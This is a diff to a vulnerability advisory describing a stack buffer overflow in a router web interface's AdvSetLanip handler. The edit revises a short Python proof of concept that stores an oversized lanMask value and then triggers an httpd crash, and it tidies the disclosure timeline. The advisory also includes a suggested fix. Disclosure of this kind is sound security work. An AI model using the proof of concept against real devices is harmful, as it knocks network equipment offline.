@@ -67,23 +67,21 @@ A persisted value of several hundred bytes (well within the 1499-byte SET limit)
 Stack memory corruption leading to denial of service (confirmed process crash). Overwrite of the saved return address is possible; arbitrary code execution may be achievable subject to the platform's exploit mitigations, but has **not** been demonstrated.
 
 ## Proof of Concept
-```
-```
+
+**Prerequisites:** Administrator access to the web interface.
+
+```python
 import requests
-
 url = "http://192.168.0.1/goform/AdvSetLanip"
-
 # Step 1: Store oversized payload to NVRAM
-data = {"lanMask": "A" * 1500}
+data = {"lanMask": "A" * 1000}
 requests.post(url, data=data)
-
 # Step 2: Trigger overflow → crash
 data = {"lanIp": "192.168.0.1"}
 requests.post(url, data=data)
-
 # Result: httpd daemon crashes
 ```
-
+![httpd daemon crash - stack corruption](crash.png)
 ## Suggested Fix
 
 - The `GetValue` API must pass the destination buffer size and bound the copy accordingly, e.g. `strncpy(param_2, local_5f4, dst_len - 1)` with an explicit `dst_len` parameter, rejecting or truncating values that exceed it.
@@ -93,6 +91,5 @@ requests.post(url, data=data)
 
 | Date | Event |
 |---|---|
-| `[2026-6-13]` | Vulnerability discovered |
-| `[2026-6-14]` | Vendor notified |
-| `[2026-6-14]` | Public disclosure / VulDB submission |
+| 2026-06-13 | Vulnerability discovered |
+| 2026-06-14 | Vendor notified |
